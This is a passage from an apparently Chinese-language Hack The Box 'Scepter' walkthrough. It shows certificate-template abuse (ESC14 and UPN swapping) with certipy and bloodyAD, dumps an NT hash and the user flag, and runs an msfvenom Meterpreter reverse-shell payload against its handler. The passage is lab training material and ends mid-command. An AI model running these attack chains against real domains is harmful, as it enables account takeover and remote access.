Required\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCertificate Authorities\u003c/td\u003e\n\u003ctd\u003escepter-DC01-CA\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCertificate Name Flag\u003c/td\u003e\n\u003ctd\u003eSubjectRequireEmailSubjectRequireDnsAsCnSubjectAltRequireEmail\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eClient Authentication\u003c/td\u003e\n\u003ctd\u003eTrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDisplay Name\u003c/td\u003e\n\u003ctd\u003eStaffAccessCertificate\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnabled\u003c/td\u003e\n\u003ctd\u003eTrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollee Supplies Subject\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollment Agent\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEnrollment Flag\u003c/td\u003e\n\u003ctd\u003eNoSecurityExtensionAutoEnrollment\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eExtended Key Usage\u003c/td\u003e\n\u003ctd\u003eClient AuthenticationServer Authentication\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMinimum RSA Key Length\u003c/td\u003e\n\u003ctd\u003e2,048\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePrivate Key Flag\u003c/td\u003e\n\u003ctd\u003e16842752\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRenewal Period\u003c/td\u003e\n\u003ctd\u003e6 weeks\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRequires Key Archival\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eRequires Manager Approval\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eTemplate Name\u003c/td\u003e\n\u003ctd\u003eStaffAccessCertificate\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eValidity Period\u003c/td\u003e\n\u003ctd\u003e99 years\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDomain\u003c/td\u003e\n\u003ctd\u003eSCEPTER.HTB\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eType\u003c/td\u003e\n\u003ctd\u003eCertificate Template\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e来自上面的链接：在此方案中，user1 对 user2 具有 \u003ccode\u003eGenericWrite\u003c/code\u003e，并希望入侵 user3。允许 user2 注册一个易受攻击的模板，该模板在 \u003ccode\u003emsPKI-Enrollment-Flag\u003c/code\u003e 值中指定 \u003ccode\u003eCT_FLAG_NO_SECURITY_EXTENSION\u003c/code\u003e 标志。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecertipy-ad shadow auto -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -user d.baker -upn h.brown -dc-ip 10.10.11.65\ncertipy-ad req -username \u003cspan class=\"hljs-string\"\u003e\"d.baker@scepter.htb\"\u003c/span\u003e -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \u003cspan class=\"hljs-string\"\u003e\"dc01.scepter.htb\"\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'StaffAccessCertificate'\u003c/span\u003e -dc-ip 10.10.11.65\ncertipy-ad account update -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -user d.baker -upn \u003cspan class=\"hljs-string\"\u003e\"d.baker@scepter\"\u003c/span\u003e -dc-ip 10.10.11.65\ncertipy-ad auth -pfx \u003cspan class=\"hljs-string\"\u003e'h.brown.pfx'\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e\"scepter.htb\"\u003c/span\u003e -dc-ip 10.10.11.65\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e执行到第三条的时候出现了如下错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  ADCS certipy-ad req -username \u003cspan class=\"hljs-string\"\u003e\"d.baker@scepter.htb\"\u003c/span\u003e -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \u003cspan class=\"hljs-string\"\u003e\"dc01.scepter.htb\"\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'StaffAccessCertificate'\u003c/span\u003e -dc-ip 10.10.11.65\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.\n[*] Request ID is 38\nWould you like to save the private key? (y/N) Y\n[*] Saved private key to 38.key\n[-] Failed to request certificate\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e表明在证书申请过程中，\u003cstrong\u003e证书颁发请求\u003c/strong\u003e中需要包含 \u003cstrong\u003eemail\u003c/strong\u003e 信息，但在你的请求中，\u003cstrong\u003eemail 信息缺失或无法获取\u003c/strong\u003e。具体来说，错误 \u003ccode\u003eCERTSRV_E_SUBJECT_EMAIL_REQUIRED\u003c/code\u003e 指明，证书模板要求在 \u003cstrong\u003eSubject\u003c/strong\u003e 或 \u003cstrong\u003eSubject Alternative Name (SAN)\u003c/strong\u003e 中必须包含有效的 email 地址。\u003c/p\u003e\n\u003cp\u003e询问\u003cstrong\u003e佬\u003c/strong\u003e们后得知可以通过 \u003ccode\u003eBloodyAD\u003c/code\u003e 来修改，将 d.baker 的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e object d.baker mail -v h.brown@scepter.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么命令就变为\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecertipy-ad shadow auto -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -user d.baker -upn h.brown -dc-ip 10.10.11.65\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e object d.baker mail -v h.brown@scepter.htb\ncertipy-ad req -username \u003cspan class=\"hljs-string\"\u003e\"d.baker@scepter.htb\"\u003c/span\u003e -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \u003cspan class=\"hljs-string\"\u003e\"dc01.scepter.htb\"\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'StaffAccessCertificate'\u003c/span\u003e -dc-ip 10.10.11.65\ncertipy-ad account update -username \u003cspan class=\"hljs-string\"\u003e\"a.carter@scepter.htb\"\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e\"123456\"\u003c/span\u003e -user d.baker -upn \u003cspan class=\"hljs-string\"\u003e\"d.baker@scepter\"\u003c/span\u003e -dc-ip 10.10.11.65\ncertipy-ad auth -pfx \u003cspan class=\"hljs-string\"\u003e'd.baker.pfx'\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e\"scepter.htb\"\u003c/span\u003e -dc-ip 10.10.11.65 -username h.brown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后获得 \u003ccode\u003eh.brown\u003c/code\u003e  的 TGT\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter certipy-ad auth -pfx \u003cspan class=\"hljs-string\"\u003e'd.baker.pfx'\u003c/span\u003e -domain \u003cspan class=\"hljs-string\"\u003e\"scepter.htb\"\u003c/span\u003e -dc-ip 10.10.11.65 -username h.brown\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the provided certificate\n[*] Using principal: h.brown@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to \u003cspan class=\"hljs-string\"\u003e'h.brown.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'h.brown'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'h.brown@scepter.htb'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e导入 TGT\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=h.brown.ccache \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e编写 \u003ccode\u003e/etc/krb5.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/krb5.conf                                                      \n[libdefaults]\n    default_realm = scepter.HTB\n    dns_lookup_realm = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    dns_lookup_kdc = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n[realms]\n    SCEPTER.HTB = {\n        kdc = dc01.scepter.htb\n        admin_server = dc01.haze.htb\n    }\n\n[domain_realm]\n    .scepter.htb = scepter.HTB\n    scepter.htb = scepter.HTB\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eevil-winrm\u003c/code\u003e登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: User is not needed \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Kerberos auth. Ticket will be used\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e终于登录进来了，事不宜迟先读 user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\h.brown\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e user.txt\n4e1f18052814cfb9f26a1497a8bc1cc6\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e收集一波数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\h.brown\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e Enabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\h.brown\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                        Attributes\n=========================================== ================ ========================================== ==================================================\nEveryone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group\nSCEPTER\\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo P.adams\u003c/h2\u003e\n\u003ch3\u003eESC14 - \u003cstrong\u003e对 altSecurityIdentities 的写入访问权限\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e现在目标用户是 \u003ccode\u003eP.adams\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e枚举用户 \u003ccode\u003eh.brown\u003c/code\u003e  是否有修改某些对象（如组成员关系、ACL 或权限）的能力。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de\n...\ndistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb\naltSecurityIdentities: WRITE\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对 \u003ccode\u003ep.adams\u003c/code\u003e 的 \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e 可写\u003c/p\u003e\n\u003cp\u003e大概是可以利用：\u003ca href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities\"\u003ehttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities\u003c/a\u003e | \u003ca href=\"https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\"\u003ehttps://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e攻击者对目标的 \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e 属性具有写入权限。他可以将证书注册为受害者，并通过修改其 \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e 属性并将其指向获取的证书来为目标创建显式映射。然后，可以使用该证书作为目标进行身份验证。\u003c/p\u003e\n\u003cp\u003e攻击根据：\u003ca href=\"https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\"\u003ehttps://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\u003c/a\u003e 的 \u003ccode\u003eESC14\u003c/code\u003e场景\u003ccode\u003eA\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e先使用 h.brown 来进行上线 MSF，后续一些操作在\u003ccode\u003eevil-winrm\u003c/code\u003e中操作会有\u003ccode\u003ebug\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected, selecting \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter msfconsole \nMetasploit tip: View all productivity tips with the tips \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e\n\n_                                                    _\n/ \\    /\\         __                         _   __  /_/ __\n| |\\  / | _____   \\ \\           ___   _____ | | /  \\ _   \\ \\\n| | \\/| | | ___\\ |- -|   /\\    / __\\ | -__/ | || | || | |- -|\n|_|   | | | _|__  | |_  / -\\ __\\ \\   | |    | | \\__/| |  | |_\n|/  |____/  \\___\\/ /\\ \\\\___/   \\/     \\__|    |_\\  \\___\\\n\n=[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\nmsf6 \u003e use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/meterpreter/reverse_tcp\npayload =\u003e windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport 1234\nlport =\u003e 1234\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost 10.10.16.59\nlhost =\u003e 10.10.16.59\nmsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\h.brown\\Documents\u003e upload shell.exe\n                                        \nInfo: Uploading /root/Desktop/test/Scepter/shell.exe to C:\\Users\\h.brown\\Documents\\shell.exe\n                                        \nData: 98400 bytes of 98400 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents\u003e ./shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n[*] Sending stage (177734 bytes) to 10.10.11.65\n[*] Meterpreter session 1 opened (10.10.16.59:1234 -\u003e 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e创建计算机账户 \u003ccode\u003eciallo\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456\n[+] ciallo created\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003ecertipy\u003c/code\u003e 请求证书\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter certipy-ad req -username \u003cspan class=\"hljs-string\"\u003e\"ciallo$\"\u003c/span\u003e -p 123456 -target \u003cspan class=\"hljs-string\"\u003e\"dc01.scepter.htb\"\u003c/span\u003e -ca \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e -template \u003cspan class=\"hljs-string\"\u003e'Machine'\u003c/span\u003e -dc-ip 10.10.11.65 -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve \u003cspan class=\"hljs-string\"\u003e'dc01.scepter.htb'\u003c/span\u003e at \u003cspan class=\"hljs-string\"\u003e'10.10.11.65'\u003c/span\u003e\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with DNS Host Name \u003cspan class=\"hljs-string\"\u003e'ciallo.scepter.htb'\u003c/span\u003e\n[*] Certificate object SID is \u003cspan class=\"hljs-string\"\u003e'S-1-5-21-74879546-916818434-740295365-9104'\u003c/span\u003e\n[*] Saved certificate and private key to \u003cspan class=\"hljs-string\"\u003e'ciallo.pfx'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将证书转换为\u003ccode\u003ecrt\u003c/code\u003e并查看信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Writing certificate and  to \u003cspan class=\"hljs-string\"\u003e'ciallo.crt'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter openssl x509 -\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e ciallo.crt -noout -serial -issuer\nserial=620000001B02CCD1DA2D79435E00000000001B\nissuer=DC=htb, DC=scepter, CN=scepter-DC01-CA\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们使用证书中的序列号和颁发者 \u003ccode\u003edistinguishedName\u003c/code\u003e 来获取 \u003ccode\u003eX509IssuerSerialNumber\u003c/code\u003e 映射格式\u003c/p\u003e\n\u003cp\u003e使用 GPT 来根据脚本：\u003ca href=\"https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1\"\u003ehttps://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1\u003c/a\u003e 改编为 Python 脚本，并运行。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport argparse\n\ndef convert(serial, issuer):\n    serial = serial.replace(\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e).lower()\n    serial_bytes = bytearray.fromhex(serial)\n    serial_bytes.reverse()\n    serial_hex = \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e([\u003cspan class=\"hljs-string\"\u003e'%02x'\u003c/span\u003e % b \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e b \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e serial_bytes])\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 拆分 issuer，并反转顺序\u003c/span\u003e\n    issuer_parts = issuer.split(\u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e)\n    issuer_parts = [p.strip() \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e p \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e issuer_parts]\n    issuer_parts.reverse()  \u003cspan class=\"hljs-comment\"\u003e# 反转顺序，这里不改\u003c/span\u003e\n    issuer_str = \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(issuer_parts)\n    \n    \u003cspan class=\"hljs-comment\"\u003e# 调整输出顺序：确保 \"DC=scepter,DC=htb\" 在 \"CN=scepter-DC01-CA\" 之前\u003c/span\u003e\n    issuer_str = issuer_str.replace(\u003cspan class=\"hljs-string\"\u003e\"CN=\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e).replace(\u003cspan class=\"hljs-string\"\u003e\"DC=\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"CN=\"\u003c/span\u003e).replace(\u003cspan class=\"hljs-string\"\u003e\",\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\",DC=\"\u003c/span\u003e).strip()\n    \n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"X509:\u0026#x3C;I\u003e{issuer_str}\u0026#x3C;SR\u003e{serial_hex}\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e'__main__'\u003c/span\u003e:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\u003cspan class=\"hljs-string\"\u003e'-serial'\u003c/span\u003e, required=True, \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'Certificate serial (colon separated)'\u003c/span\u003e)\n    parser.add_argument(\u003cspan class=\"hljs-string\"\u003e'-issuer'\u003c/span\u003e, required=True, \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'Certificate issuer'\u003c/span\u003e)\n    args = parser.parse_args()\n    \n    convert(args.serial, args.issuer)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter python Get-X509IssuerSerialNumberFormat.py\nX509:\u0026#x3C;I\u003eCN=scepter-DC01-CA,DC=scepter,DC=htb\u0026#x3C;SR\u003eB10000000000E53497D2AD1DCC20B100000026\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 PowerShell 更改用户 h.brown 的 \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e 属性（GPT）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-variable\"\u003e$map\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'X509:\u0026#x3C;I\u003eDC=htb,DC=scepter,CN=scepter-DC01-CA\u0026#x3C;SR\u003e2800000000008dde9c88b25b6ad22800000062'\u003c/span\u003e\nSet-ADUser p.adams -Replace @{altSecurityIdentities=\u003cspan class=\"hljs-variable\"\u003e$map\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emeterpreter \u003e shell\nProcess 4920 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.7131]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\h.brown\\Documents\u003epowershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\h.brown\\Documents\u003e \u003cspan class=\"hljs-variable\"\u003e$map\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'X509:\u0026#x3C;I\u003eCN=scepter-DC01-CA,DC=scepter,DC=htb\u0026#x3C;SR\u003e170000000000f4a3741fa7d9137b1700000062'\u003c/span\u003e\n\u003cspan class=\"hljs-variable\"\u003e$map\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'X509:\u0026#x3C;I\u003eCN=scepter-DC01-CA,DC=scepter,DC=htb\u0026#x3C;SR\u003e170000000000f4a3741fa7d9137b1700000062'\u003c/span\u003e\nPS C:\\Users\\h.brown\\Documents\u003e Set-ADUser -Identity \u003cspan class=\"hljs-string\"\u003e\"p.adams\"\u003c/span\u003e -Replace @{altSecurityIdentities=\u003cspan 